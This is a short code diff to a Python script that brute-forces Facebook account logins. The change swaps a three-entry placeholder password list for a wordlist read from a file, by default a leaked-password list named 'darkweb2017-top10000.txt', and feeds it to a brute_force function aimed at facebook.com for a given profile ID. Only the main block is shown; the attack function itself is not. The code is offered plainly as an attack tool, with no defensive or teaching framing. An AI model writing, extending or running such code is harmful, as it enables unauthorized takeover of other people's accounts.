@@ -81,7 +81,12 @@ if __name__ == "__main__":
 
     url = 'https://www.facebook.com/'
     profile_id = get_profile_id(url)
+
+    wordlist_path = args.wordlist if args.wordlist else 'darkweb2017-top10000.txt'
     
+    with open(wordlist_path, 'r') as f:
+        wordlist = [line.strip() for line in f.readlines()]
+
     logging.info("Brute force started.")
-    brute_force(url, profile_id, ['password1', 'password2', 'password3'])
+    brute_force(url, profile_id, wordlist)
     logging.info("Brute force completed.")
